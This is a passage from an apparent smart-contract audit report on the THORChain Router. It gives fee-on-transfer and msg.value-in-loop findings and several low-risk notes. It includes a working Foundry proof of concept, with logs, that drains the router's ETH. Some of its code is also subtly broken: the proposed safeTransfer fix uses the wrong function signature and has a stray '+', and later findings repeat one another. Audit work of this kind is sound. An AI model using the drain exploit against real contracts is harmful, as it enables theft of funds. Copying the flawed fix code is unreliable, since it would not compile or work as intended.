    const startingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);

    /* Log starting balances */
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(startingTokenBalanceOfUser1)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(startingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(startingTokenBalanceOfAggregator)
    );

    /* User1 deposits tokens in the ASGARD vault */
    /* Remember that the vault will be credited _20 - transferFee */
    await FEE_ON_TRANSFER_TOKEN.approve(ROUTER.address, _20, { from: USER1 });
    await ROUTER.depositWithExpiry(
      ASGARD,
      FEE_ON_TRANSFER_TOKEN.address,
      _20,
      '',
      currentTime,
      {
        from: USER1,
      }
    );

    /* Log token balance of Router and the accounted allowance after deposit */
    const tokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );

    console.log(
      '\nFEE_ON_TRANSFER_TOKEN Balance Router:',
      BN2Str(tokenBalanceOfRouter)
    );
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(transferFee))); // after FEE_ON_TRANSFER_TOKEN deposit

    /* 
      The ASGARD initiates a transfer out and call
      This action transfers _1 token to the aggregator, 
      BUT the aggreagator receives _1 - transferFee because of the fee-on-transfer.
      The code in the router calls swapOutV5 with the _1, not _1 - transferFee.

      This will make the transaction to revert if the aggregator does not have enough tokens,
      because the swapOutV5 function will try to transfer _1 token, but it has _1 - transferFee.

      OR (like) in our case, the aggregator has tokens that should be rescued and the swapOutV5 is called with _1
      and the transfer fee is paid by the funds that should be rescued
     */
    const swaps = 7;
    const swapAmount = _1;

    for (let i = 0; i < swaps; i++) {
      await ROUTER.transferOutAndCallV5(
        [
          AGG.address,
          FEE_ON_TRANSFER_TOKEN.address,
          swapAmount,
          ETH,
          USER1,
          '0',
          'MEMO',
          '0x', // empty payload
          'bc123', // dummy address
        ],
        { from: ASGARD, value: 0 }
      );
    }

    /* Calculate total transfer fee paid */
    const totalAmountSwapped = getBN(swapAmount).multipliedBy(swaps);
    const totalTransferFeePaid = getBN(transferFee).multipliedBy(swaps);

    /* Get ending balances of the FEE_ON_TRANSFER_TOKEN */
    const endingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const endingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
    const endingTokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );
    const endingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);

    /* Log starting balances */
    console.log(
      '\nFinal FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(endingTokenBalanceOfAggregator)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(endingTokenBalanceOfUser1)
    );

    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(endingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance ROUTER:',
      BN2Str(endingTokenBalanceOfRouter)
    );

    /* Make assertions */
    /* Less 1 FEE_ON_TRANSFER_TOKEN - transfer fee (only one transfer User1 -> Router) */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(totalAmountSwapped).minus(transferFee)));

    /* Add 1 FEE_ON_TRANSFER_TOKEN - (transfer fee) * swaps */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address))
    ).to.equal(BN2Str(getBN(totalAmountSwapped).minus(totalTransferFeePaid)));

    /* KEY ASSERTIONS */
    /* Expect aggregator's funds to be rescued to be less than starting ones */
    expect(
      getBN(endingTokenBalanceOfAggregator).isLessThan(
        getBN(startingTokenBalanceOfAggregator)
      )
    ).to.equal(true);
  });
});
```

</details>

### Recommended Mitigation Steps

Consider creating a `safeTransfer` function, similar to the `safeTransferFrom`.

Add this below `THORChain_Router::safeTransferFrom`:

```diff
+ // Safe transfer in case asset charges transfer fees
+ function safeTransfer(address _asset, address _to, uint256 _amount) internal returns (uint256 amount) {
+   uint256 _startBal = iERC20(_asset).balanceOf(_to);
+   (bool success, bytes memory data) =
+       _asset.call(abi.encodeWithSignature("transfer(address,address,uint256)", msg.sender, _to, + _amount));
+   require(success && (data.length == 0 || abi.decode(data, (bool))), "Failed to transfer token");
+   return (iERC20(_asset).balanceOf(_to) - _startBal);
+ }
```

In `THORChain_Router::_transferOutAndCallV5`:

```diff
- (bool transferSuccess, bytes memory data) = aggregationPayload.fromAsset.call(
-   abi.encodeWithSignature(
-       "transfer(address,uint256)", aggregationPayload.target, aggregationPayload.fromAmount
-   )
- );
-
- require(
-  transferSuccess && (data.length == 0 || abi.decode(data, (bool))),
-  "Failed to transfer token before dex agg call"
- );

+ uint256 safeAmount =
+  safeTransfer(aggregationPayload.fromAsset, aggregationPayload.target, aggregationPayload.fromAmount);
```

### Assessed type

Token-Transfer

**[the-eridanus (Thorchain) confirmed via duplicate Issue #15](https://github.com/code-423n4/2024-06-thorchain-findings/issues/15#event-13189588975)**

***

## [[M-02] Due to the use of `msg.value` in for loop, anyone can drain all the funds from the `THORChain_Router` contract](https://github.com/code-423n4/2024-06-thorchain-findings/issues/44)
*Submitted by [PetarTolev](https://github.com/code-423n4/2024-06-thorchain-findings/issues/44), also found by [mt030d](https://github.com/code-423n4/2024-06-thorchain-findings/issues/94), [samuraii77](https://github.com/code-423n4/2024-06-thorchain-findings/issues/90), [bigtone](https://github.com/code-423n4/2024-06-thorchain-findings/issues/78), [0xfox](https://github.com/code-423n4/2024-06-thorchain-findings/issues/77), [TECHFUND-inc](https://github.com/code-423n4/2024-06-thorchain-findings/issues/72), [0xAadi](https://github.com/code-423n4/2024-06-thorchain-findings/issues/71), [benoitonchain](https://github.com/code-423n4/2024-06-thorchain-findings/issues/63), [Team\_RockSolid](https://github.com/code-423n4/2024-06-thorchain-findings/issues/61), [ilchovski](https://github.com/code-423n4/2024-06-thorchain-findings/issues/56), [Svetoslavb](https://github.com/code-423n4/2024-06-thorchain-findings/issues/54), [Timenov](https://github.com/code-423n4/2024-06-thorchain-findings/issues/51), [EPSec](https://github.com/code-423n4/2024-06-thorchain-findings/issues/50), [hunter\_w3b](https://github.com/code-423n4/2024-06-thorchain-findings/issues/48), [Shaheen](https://github.com/code-423n4/2024-06-thorchain-findings/issues/34), [inh3l](https://github.com/code-423n4/2024-06-thorchain-findings/issues/30), [Limbooo](https://github.com/code-423n4/2024-06-thorchain-findings/issues/12), [LuarSec](https://github.com/code-423n4/2024-06-thorchain-findings/issues/7), [shaflow2](https://github.com/code-423n4/2024-06-thorchain-findings/issues/3), [Gosho](https://github.com/code-423n4/2024-06-thorchain-findings/issues/39), and [0x1771](https://github.com/code-423n4/2024-06-thorchain-findings/issues/60)*

<https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L309-L311><br><https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L324>

### Vulnerability details

The functions [`transferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L391-L395) and [`batchTransferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L397-L403) both internally invoke [`_transferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L304). This function, in turn, calls the `swapOutV5()` function on the `aggregationPayload.target`, which should be the `THORChain_Aggregator` contract.

However, the `aggregationPayload` is a struct passed as a parameter through either [`transferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L391-L395) or [`batchTransferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L397-L403). This allows anyone to set the `aggregationPayload.target` address to their preference without any validation.

When a low-level call to `aggregationPayload.target` is made, the return value `swapOutSuccess` is checked. If it's false, a fallback logic attempts to `send` the `msg.value` to the target. If this also fails, the `msg.value` is refunded to the `msg.sender`.

The issue arises when [`batchTransferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L397-L403) is called. It loops through the `aggregationPayloads` array and passes each element to [`_transferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L304), which then sends the `msg.value` multiple times to either the `target` address or `msg.sender`.

```solidity
  function batchTransferOutAndCallV5(
    TransferOutAndCallData[] calldata aggregationPayloads
  ) external payable nonReentrant {
    for (uint i = 0; i < aggregationPayloads.length; ++i) {
@>    _transferOutAndCallV5(aggregationPayloads[i]);
    }
  }
  
  function _transferOutAndCallV5(
    TransferOutAndCallData calldata aggregationPayload
  ) private {
    if (aggregationPayload.fromAsset == address(0)) {
      // call swapOutV5 with ether
@>    (bool swapOutSuccess, ) = aggregationPayload.target.call{
        value: msg.value
      }(
        abi.encodeWithSignature(
          "swapOutV5(address,uint256,address,address,uint256,bytes,string)",
          aggregationPayload.fromAsset,
          aggregationPayload.fromAmount,
          aggregationPayload.toAsset,
          aggregationPayload.recipient,
          aggregationPayload.amountOutMin,
          aggregationPayload.payload,
          aggregationPayload.originAddress
        )
      );
@>    if (!swapOutSuccess) {
@>      bool sendSuccess = payable(aggregationPayload.target).send(msg.value); // If can't swap, just send the recipient the gas asset
        if (!sendSuccess) {
@>        payable(address(msg.sender)).transfer(msg.value); // For failure, bounce back to vault & continue.
        }
      }

      emit TransferOutAndCallV5(
        msg.sender,
        aggregationPayload.target,
        msg.value,
        aggregationPayload.toAsset,
        aggregationPayload.recipient,
        aggregationPayload.amountOutMin,
        aggregationPayload.memo,
        aggregationPayload.payload,
        aggregationPayload.originAddress
      );
    } else {
      ...
    }
  }
```

### Impact

There are two issues associated with the use of `msg.value` in `_transferOutAndCallV5`:
- The first one, described in the Proof of Concept section below, is of high severity. A malicious user could potentially drain all funds from the `THORChain_Router`.
- The second issue is of medium severity. When a trusted actor invokes the `batchTransferOutAndCallV5` function and if the length of the `aggregationPayloads` array exceeds 1, it will constantly revert. This happens because the entire `msg.value` is sent in the first iteration, causing the second iteration to revert with `OutOfFunds` when the Router’s balance is reduced to zero.

### Proof of Concept

Consider a scenario where the Router's balance is 100e18 ethers. Suppose the [`batchTransferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L397-L403) function is called with an array of 11 struct elements, each with the following parameters:

- `aggregationPayload.fromAsset = address(0)`.
- The `aggregationPayload.target` address is EOA controlled by the attacker.

The [call](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/chain/ethereum/contracts/THORChain_Router.sol#L309) will return false and then enter the fallback logic in the if statement. This action sends the `msg.value` to the `aggregationPayload.target`. This process is repeated for each element in the calldata array, resulting in the router being completely drained. The scenario is demonstrated in the coded proof of concept below.

**Coded POC:**

To run the test, you first need to initialize the Foundry project in the repo using `forge init --force`. Then, place the following test in the test folder and run it with `forge test -vvv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {THORChain_Router} from "../contracts/THORChain_Router.sol";

contract RouterTest is Test {
    THORChain_Router public router;
    address alice = makeAddr("alice");

    function setUp() public {
        router = new THORChain_Router();
    }

    function testRouterDrain() public {
        deal(address(router), 100e18);
        deal(alice, 10e18);

        console.log("alice's balance before: ", alice.balance);
        console.log("router's balance before:", address(router).balance);

        THORChain_Router.TransferOutAndCallData[] memory cdArray = new THORChain_Router.TransferOutAndCallData[](11);

        for(uint i; i < 11; i++) {
            cdArray[i] = THORChain_Router.TransferOutAndCallData(
                payable(alice),
                address(0),
                10e18,
                address(0),
                alice,
                0,
                "",
                "",
                ""
            );
        }

        vm.prank(alice);
        router.batchTransferOutAndCallV5{value: 10e18}(cdArray);

        console.log("alice's balance after:  ", alice.balance);
        console.log("router's balance after: ", address(router).balance);
    }
}
```

The result will be:

```solidity
[PASS] testRouterDrain() (gas: 242833)
Logs:
  alice's balance before:  10000000000000000000
  router's balance before: 100000000000000000000
  alice's balance after:   110000000000000000000
  router's balance after:  0
```

### Recommended Mitigation Steps

It is recommended to avoid the use of `msg.value` in for loops. To mitigate the current issue, the cumulative value sent to the `aggregationPayload.target` should not exceed the `msg.value`. This can be achieved by adding a parameter `etherAmount` in the `TransferOutAndCallData` struct, which will be used instead of `msg.value` in the `_transferOutAndCallV5`. Then, add a require statement in the `batchTransferOutAndCallV5` which checks if `msg.value == cumulativeValueSent`.

```diff
  struct TransferOutAndCallData {
    address payable target;
    address fromAsset;
    uint256 fromAmount;
    address toAsset;
    address recipient;
    uint256 amountOutMin;
    string memo;
    bytes payload;
    string originAddress;
+   uint256 etherAmount;
  }
  
  function batchTransferOutAndCallV5(
    TransferOutAndCallData[] calldata aggregationPayloads
  ) external payable nonReentrant {
+   uint cumulativeValueSent;
    for (uint i = 0; i < aggregationPayloads.length; ++i) {
+     cumulativeValueSent += aggregationPayloads[i].etherAmount;
      _transferOutAndCallV5(aggregationPayloads[i]);
    }
+   require(msg.value == cumulativeValueSent);
  }
  
  function _transferOutAndCallV5(
    TransferOutAndCallData calldata aggregationPayload
  ) private {
    if (aggregationPayload.fromAsset == address(0)) {
      // call swapOutV5 with ether
      (bool swapOutSuccess, ) = aggregationPayload.target.call{
-       value: msg.value
+       value: aggregationPayload.etherAmount
      }(
        abi.encodeWithSignature(
          "swapOutV5(address,uint256,address,address,uint256,bytes,string)",
          aggregationPayload.fromAsset,
          aggregationPayload.fromAmount,
          aggregationPayload.toAsset,
          aggregationPayload.recipient,
          aggregationPayload.amountOutMin,
          aggregationPayload.payload,
          aggregationPayload.originAddress
        )
      );
      if (!swapOutSuccess) {
-       bool sendSuccess = payable(aggregationPayload.target).send(msg.value); // If can't swap, just send the recipient the gas asset
+       bool sendSuccess = payable(aggregationPayload.target).send(aggregationPayload.etherAmount); // If can't swap, just send the recipient the gas asset
        if (!sendSuccess) {
-         payable(address(msg.sender)).transfer(msg.value); // For failure, bounce back to vault & continue.
+         payable(address(msg.sender)).transfer(aggregationPayload.etherAmount); // For failure, bounce back to vault & continue.
        }
      }

      emit TransferOutAndCallV5(
        msg.sender,
        aggregationPayload.target,
-       msg.value,
+       aggregationPayload.etherAmount,
        aggregationPayload.toAsset,
        aggregationPayload.recipient,
        aggregationPayload.amountOutMin,
        aggregationPayload.memo,
        aggregationPayload.payload,
        aggregationPayload.originAddress
      );
    } else {
      ...
    }
  }
```

### Assessed type

ETH-Transfer

**[the-eridanus (Thorchain) confirmed via duplicate Issue #7](https://github.com/code-423n4/2024-06-thorchain-findings/issues/7#event-13189419376)**

**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2024-06-thorchain-findings/issues/44#issuecomment-2182549050)**

***

# Low Risk and Non-Critical Issues

For this audit, 6 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-06-thorchain-findings/issues/106) by **sivanesh_808** received the top score from the judge.

*The following wardens also submitted reports: [hunter\_w3b](https://github.com/code-423n4/2024-06-thorchain-findings/issues/98), [EPSec](https://github.com/code-423n4/2024-06-thorchain-findings/issues/101), [Naresh](https://github.com/code-423n4/2024-06-thorchain-findings/issues/102), [hihen](https://github.com/code-423n4/2024-06-thorchain-findings/issues/100), and [slvDev](https://github.com/code-423n4/2024-06-thorchain-findings/issues/99).*

## [01] Inadequate fallback mechanism in `transferOut` function

`THORChain_Router.sol`

### Description

Similar to the `_deposit` function, the `transferOut` function contains a vulnerability due to the inadequate handling of failed ETH transfers using `send`. This can result in ETH being permanently locked in the contract if the transfer fails, as there is no proper fallback or error handling mechanism to manage these scenarios.

**Code snippet:**
```solidity
function transferOut(
    address payable to,
    address asset,
    uint amount,
    string memory memo
) public payable nonReentrant {
    uint safeAmount;
    if (asset == address(0)) {
        safeAmount = msg.value;
        bool success = to.send(safeAmount); // Send ETH.
        if (!success) {
            payable(address(msg.sender)).transfer(safeAmount); // For failure, bounce back to vault & continue.
        }
    } else {
        _vaultAllowance[msg.sender][asset] -= amount; // Reduce allowance
        (bool success, bytes memory data) = asset.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))));
        safeAmount = amount;
    }
    emit TransferOut(msg.sender, to, asset, safeAmount, memo);
}
```

**Expected Behavior:** On failure of ETH transfer, the ETH should be securely returned to the sender or a proper retry mechanism should be in place.

**Expected Behavior code snippet:**
```solidity
(bool success, ) = to.call{value: safeAmount}("");
if (!success) {
    // Implement retry logic or return funds to sender securely
    revert("ETH transfer failed, funds returned to sender");
}
```

**Logic:**
1. Contract attempts to transfer `safeAmount` of ETH to `to`.
2. If `send` operation fails, it tries to return the ETH back to the sender.
3. Should handle return failure or provide an alternative mechanism.

**Actual Behavior:** The current implementation can lead to ETH getting locked in the contract if the fallback transfer fails.

**Actual Behavior code snippet:**
```solidity
bool success = to.send(safeAmount);
if (!success) {
    payable(address(msg.sender)).transfer(safeAmount); // For failure, bounce back to vault & continue.
}
```

**Logic:**
1. Contract attempts to transfer `safeAmount` of ETH to `to`.
2. If `send` fails, it tries to bounce the ETH back to the sender.
3. This second transfer can fail without any handling or logging, resulting in ETH locked within the contract.

### Recommendation

It's recommended to revise the handling of ETH transfers using `.call` to provide more gas for recipients and to include explicit error handling or retries, thus aligning the practice with modern Solidity safety standards. This adjustment ensures that transaction failures are managed effectively, preserving contract integrity and user funds.

## [02] Miscalculation and potential loss of funds in `safeTransferFrom` function

`THORChain_Router.sol`

### Description

The `safeTransferFrom` function is intended to handle the transfer of ERC-20 tokens while accounting for potential transfer fees by comparing the balances before and after the transfer. However, this function fails to revert the transaction or handle cases where the actual amount transferred is less than the requested amount due to token fees or other deductions, leading to a mismatch in balance tracking and potential loss of funds for users.

**Code snippet:**
```solidity
function safeTransferFrom(
    address _asset,
    uint _amount
) internal returns (uint amount) {
    uint _startBal = iERC20(_asset).balanceOf(address(this));
    (bool success, bytes memory data) = _asset.call(
        abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            _amount
        )
    );
    require(success && (data.length == 0 || abi.decode(data, (bool))));
    return (iERC20(_asset).balanceOf(address(this)) - _startBal);
}
```

**Expected Behavior:** The function should correctly calculate the transferred amount and revert if the actual amount received is less than expected, thus preventing any discrepancy in balance tracking.

**Expected Behavior code snippet:**
```solidity
function safeTransferFrom(
    address _asset,
    uint _amount
) internal returns (uint amount) {
    uint _startBal = iERC20(_asset).balanceOf(address(this));
    (bool success, bytes memory data) = _asset.call(
        abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            _amount
        )
    );
    require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
    uint transferredAmount = iERC20(_asset).balanceOf(address(this)) - _startBal;
    require(transferredAmount >= _amount, "Transferred amount less than required");
    return transferredAmount;
}
```

**Logic:**
1. Record the starting balance of the token in the contract.
2. Perform the transfer from the sender to the contract.
3. Calculate the difference in balance after the transfer.
4. If the actual transferred amount is less than what was requested, revert the transaction.

**Actual Behavior:** The function returns the difference in the balance, which may be less than the requested transfer amount due to fees or other deductions, without verifying that the full amount has been received.

**Actual Behavior code snippet:**
```solidity
return (iERC20(_asset).balanceOf(address(this)) - _startBal);
```

**Logic:**
1. Record the starting balance of the token.
2. Transfer the tokens from the sender to the contract.
3. Return the net change in the balance, which can be less than the intended amount if deductions apply, potentially leading to inconsistencies and unintended loss of tokens for users.

This calculation error could lead to scenarios where the contract operates with incorrect assumptions about token balances; thereby, affecting subsequent transactions and user balances within the contract. It's critical to implement strict checks and balances in token handling functions to ensure consistency and prevent financial discrepancies.

Let's break down the Logic in both the expected and actual behaviors of the `safeTransferFrom` function to clarify the potential issues:

### Expected Behavior Logic

1. **Record Initial Balance:** The contract queries the token balance it holds before initiating the transfer. Let's say the initial balance is `initialBalance`.
2. **Transfer Requested:** The contract attempts to transfer `_amount` tokens from the sender to itself. For simplicity, assume `_amount` equals 100 tokens.
3. **Verify Transfer Success:** The contract checks if the `transferFrom` call was successful. If not, it reverts the transaction.
4. **Calculate Actual Transferred Amount:** After the transfer, the contract queries its new balance, referred to as `newBalance`. Let's say the new balance is `initialBalance + 98` due to some tokens being deducted as fees or for other reasons during the transfer.
5. **Check Amount Consistency:** The contract calculates the difference `newBalance - initialBalance` to find out the actual amount transferred. In our example, this would be `98 tokens`.
6. **Revert if Amount Is Insufficient:** The contract then checks if this amount is at least `_amount` (100 tokens). If it's less (as in our example, where only 98 tokens were received), the transaction is reverted to protect against loss of funds due to deductions.

### Actual Behavior Logic

1. **Record Initial Balance:** The same initial step, recording `initialBalance`.
2. **Transfer Requested:** The contract still attempts to transfer `_amount` (100 tokens) from the sender to itself.
3. **Verify Transfer Success:** The contract ensures the transfer was reported as successful by the token contract.
4. **Calculate Transferred Amount Difference:** The contract computes `newBalance - initialBalance`. Assume again `newBalance` is `initialBalance + 98`.
5. **Return the Difference:** Instead of checking if the received amount matches the requested amount, the contract directly returns the difference, which is 98 tokens.
6. **Potential Loss Not Handled:** In this scenario, the contract does not verify if the 98 tokens are adequate compared to the requested 100 tokens. It simply proceeds with the assumption that the transfer was correct, potentially leading to issues where less than the intended amount is credited, affecting balance accuracy and possibly leading to operational errors or financial loss.

In summary, the expected behavior includes a safeguard to revert transactions when the net transferred amount is less than what was demanded, ensuring integrity and consistency in token balances. The actual behavior; however, lacks this safeguard, allowing discrepancies to go unchecked and potentially resulting in a shortfall in credited funds.

## [03] Decimal handling in `GetTxInItem` function

`smartcontract_log_parser.go`

### Description

The function `GetTxInItem` processes log entries to extract and convert amounts based on the token's decimal configuration. However, the code snippet provided does not show any evidence of handling decimal values when converting big integer amounts to the `cosmos.Uint` type. If the token's decimals are not correctly accounted for during the conversion, it could lead to financial discrepancies, such as representing token amounts incorrectly, either vastly inflating or deflating their true value in the transaction records.

**Code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Expected Behavior:** The contract should convert the token amounts accurately according to the token's decimal configuration, ensuring that all financial calculations reflect the actual token values intended by the users.

**Expected Behavior code snippet:**
```go
// Assuming amtConverter properly adjusts the amount based on the token's decimals
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount, decimals)));
```

**Logic:**
1. A deposit event is received with a token amount in its smallest unit (e.g., wei for ETH).
2. The function retrieves the decimal configuration for the token.
3. The amount is adjusted according to the decimals, converting it into a more human-readable format or the standard unit (e.g., ether for ETH).

**Actual Behavior:** The provided code snippet lacks visible handling or conversion logic taking into account the decimals of tokens, which could either underrepresent or overrepresent the amount of tokens deposited, leading to financial errors.

**Actual Behavior code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Logic:**
1. A deposit event is received, and the token amount is intended to be converted.
2. The decimal information is fetched but not utilized effectively in the conversion, possibly leading to incorrect financial representation in the contract's state or transaction outputs.

## [04] Inconsistent event handling in `GetTxInItem` function

`smartcontract_log_parser.go`

### Description

The `GetTxInItem` function handles different event logs but has a lack of consistent handling for scenarios where multiple events of a particular type (like `transferOutEvent`) occur in the same transaction. The code contains checks for multiple deposit events with different destination addresses but does not adequately handle similar scenarios for `transferOutEvent` or `transferAllowanceEvent`. This inconsistency can lead to financial discrepancies, especially in cases where multiple transfers should be recorded but are ignored due to early exits or missing validation.

**Code snippet:**
```go
if err != nil {
    scp.logger.Err(err).Msg("fail to parse transfer out event");
    continue;
}
m, err := memo.ParseMemo(common.LatestVersion, transferOutEvt.Memo);
if err != nil {
    scp.logger.Err(err).Str("memo", transferOutEvt.Memo).Msg("failed to parse transferOutEvent memo");
    continue;
}
if !m.IsOutbound() && !m.IsType(memo.TxMigrate) {
    scp.logger.Error().Str("memo", transferOutEvt.Memo).Msg("incorrect memo for transferOutEvent");
    continue;
}
```

**Expected Behavior:** The function should handle multiple transfer events consistently, ensuring all valid transfers are recorded and processed. Proper checks and balances should be implemented to handle multiple event scenarios without data loss.

**Expected Behavior code snippet:**
```go
if len(txInItem.Coins) > 0 && !txInItem.SameAssetAndAddress(transferOutEvt.Asset, transferOutEvt.To) {
    return false, fmt.Errorf("multiple transfer events with different assets or destinations detected");
}
```

**Logic:**
1. A `transferOutEvent` is processed, and its validity is checked.
2. If multiple transfer events with different destinations or assets occur, they are all processed without ignoring any unless explicitly invalid.
3. All valid transactions are logged, and no financial data is lost due to oversight.

**Actual Behavior:** The function may prematurely exit upon encountering a transfer out event, potentially ignoring subsequent valid events within the same transaction log. This behavior can lead to unrecorded transfers, affecting the financial integrity of the contract.

**Actual Behavior code snippet:**
```go
if !m.IsOutbound() && !m.IsType(memo.TxMigrate) {
    scp.logger.Error().Str("memo", transferOutEvt.Memo).Msg("incorrect memo for transferOutEvent");
    continue;
}
```

**Logic:**
1. A `transferOutEvent` is processed.
2. If the event does not meet specific memo criteria, it is ignored, and processing potentially stops for other valid events within the same log.
3. This can lead to discrepancies in recorded transactions, especially if multiple valid transfers are present.

## [05] Error handling and financial risk in `parseTransferOutAndCall` function

`smartcontract_log_parser.go`

### Description

In the `parseTransferOutAndCall` function, the error handling approach could lead to financial inaccuracies, particularly when parsing the `TransferOutAndCall` event. If an error occurs while unpacking the event data, the function immediately returns `nil`, potentially causing subsequent valid logs to be ignored. This premature exit without proper logging or handling of the error might result in missing crucial transaction information, which could directly impact financial operations or lead to misrepresentation of the transaction flow.

**Code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    return nil, err
}
```

**Expected Behavior:** The contract should robustly handle errors by logging them and continue processing other logs in the transaction to ensure no valid data is omitted due to an error in a single event.

**Expected Behavior code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    scp.logger.Warn().Err(err).Msg("Failed to unpack TransferOutAndCall event, continuing with other logs.");
    continue // assuming this is within a loop processing multiple logs
}
```

**Logic:**
1. Attempt to parse each log entry for a `TransferOutAndCall` event.
2. If an error occurs, log the error but do not exit the function.
3. Continue processing other log entries in the queue, ensuring complete analysis of the transaction log.

**Actual Behavior:** The function stops processing and returns immediately when an error is encountered in unpacking a single event log.

**Actual Behavior code snippet:**
```go
if err := scp.unpackVaultLog(event, TransferOutAndCallEventName, log); err != nil {
    return nil, err
}
```

**Logic:**
1. When parsing `TransferOutAndCall` encounters an error, the function exits immediately.
2. This could skip processing of subsequent logs in the same transaction, potentially leading to a loss of important financial data or misrepresenting the transaction's effects in the ledger.

## [06] Decimal conversion issue in amount conversion logic

`smartcontract_log_parser.go`

### Description

The `GetTxInItem` function uses the `amtConverter` to convert token amounts using Big Integers but does not correctly apply the token's decimal configuration during the conversion. This omission can result in financial inaccuracies when token amounts are represented in the user interface or calculations, leading to either underestimation or overestimation of token values based on the decimals not being accounted for in the conversion process.

**Code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Expected Behavior:** The amount conversion should factor in the token's decimal places, ensuring that all financial operations correctly reflect the value as intended in the broader financial ecosystem of the cryptocurrency involved.

**Expected Behavior code snippet:**
```go
// Correct implementation would consider the decimal places in conversion
cosmos.Uint adjustedAmount = scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount, decimals);
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, adjustedAmount));
```

**Logic:**
1. Retrieve the decimal configuration for the token.
2. Adjust the Big Integer amount according to the token's decimals before converting it to `cosmos.Uint`.
3. Use the adjusted amount in financial transactions to ensure accuracy.

**Actual Behavior:** The function ignores the decimals of the asset during conversion, leading to potential financial errors where the represented value in transactions does not match the actual value of the asset as per its decimal definition.

**Actual Behavior code snippet:**
```go
txInItem.Coins = append(txInItem.Coins,
    common.NewCoin(asset, scp.amtConverter(depositEvt.Asset.String(), depositEvt.Amount)).WithDecimals(decimals));
```

**Logic:**
1. The Big Integer amount is converted directly to `cosmos.Uint` without adjusting for decimals.
2. The resultant value might significantly misrepresent the true value, leading to transactional inaccuracies and potential financial losses for users interacting with the contract.

## [07] Inadequate validation of event unpacking in `parseTransferOutAndCall`

`smartcontract_log_parser.go`

### Description

